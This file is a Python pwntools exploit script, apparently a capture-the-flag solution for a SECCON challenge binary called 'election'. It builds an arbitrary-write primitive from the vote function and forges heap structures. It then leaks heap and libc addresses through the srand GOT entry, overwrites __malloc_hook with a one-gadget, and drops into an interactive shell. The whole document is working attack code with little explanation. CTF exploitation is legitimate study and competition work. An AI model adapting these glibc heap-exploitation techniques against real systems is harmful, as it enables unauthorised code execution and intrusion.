# Need a couple of tries to get shell, some issue in a_write

from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./election"
bin = ELF(file)
libc = ELF("libc-2.23.so")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.23.so")}

#conn = remote("election.pwn.seccon.jp", 28349)
conn = process(file, env=env)

def stand(name):
    conn.recvuntil("chocolate\n>>")
    conn.sendline("1")
    conn.recvuntil("Enter the name")
    conn.sendline(name)

def vote(show, name, name2 = None, leak=False):
    conn.recvuntil("chocolate\n>>")
    conn.sendline("2")
    conn.recvuntil("Show candidates")
    conn.sendline(show)
    if show == "y":
        conn.recvuntil("Candidates")
    if not leak:
        conn.recvuntil("name of the")
    conn.sendline(name)
    if name2 is not None:
        if not leak:
            conn.recvuntil("I'm not 'Oshima'")
        conn.sendline(name2)

def result():
    conn.recvuntil("chocolate\n>>")
    conn.sendline("3")

def a_add(addr, value, step=False):
    if step and value > 0x70:
        a_add(addr, 0x70, step)
        value -= 0x70
    payload = "yes".ljust(0x20, "\x00")
    payload += p64(addr - 0x10)
    payload += p8(value)
    vote("n", "oshima", payload)

def a_write(addr, value, orig = "", step=False):
    """Assuming existing value was 0"""
    while value != "" or orig != "":
        v = ord(value[0])
        if orig is not "":
            v = v - ord(orig[0])
            if v < 0:
                v += 0x100
            a_add(addr, v, step)
            orig = orig[1:]
        else:
            a_add(addr, v, step)
        addr += 1
        value = value[1:]

fake_chunk1 = 0x602040

ojima_str = fake_chunk1 + 0x100

# Creating a fake structure inside string
fake_struct = "a"*8 # fd
fake_struct += "a"*8 # bk
fake_struct += p64(ojima_str) # prev_size of a structure heap chunk
stand(fake_struct)
stand("random_string") # This is the next heap chunk containing structure
stand("ojima") # This is needed for leaking heap address

a_write(ojima_str, "ojima", step=True) # To continue arbitrary write

a_add(bin.symbols['list'], 0xb0) # To out fake structure

for i in range(0x20):
    vote("n", "ojima") # Increment name pointer to heap pointer

a_add(bin.symbols['list'], 0x50) # List pointer now points back to our

# Leaking heap address
vote("y", "random_name", leak=True)
conn.recvuntil("ojima\n* ")

heap_addr = u64(conn.recvline().strip().ljust(0x8, "\x00"))
log.info("Leaked heap address: " + hex(heap_addr))

chunk_addr = heap_addr - 0x60 # Address of the second chunk in the list
current_name_ptr = heap_addr - 0x20

a_write(chunk_addr, p64(bin.got['srand']), p64(current_name_ptr))

# Leaking libc address
vote("y", "random_name", leak=True)
conn.recvuntil("ojima\n* ")
srand_addr = u64(conn.recvline().strip().ljust(0x8, "\x00"))
log.info("Leaked libc address: " + hex(srand_addr))

libc_base = srand_addr - libc.symbols['srand']
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
one_shot_gadget = libc_base + 0xf0274

a_write(malloc_hook_addr, p64(one_shot_gadget), step=True)

a_write(bin.symbols['lv'], "\x00", "\x02")

stand("haha")

conn.interactive()

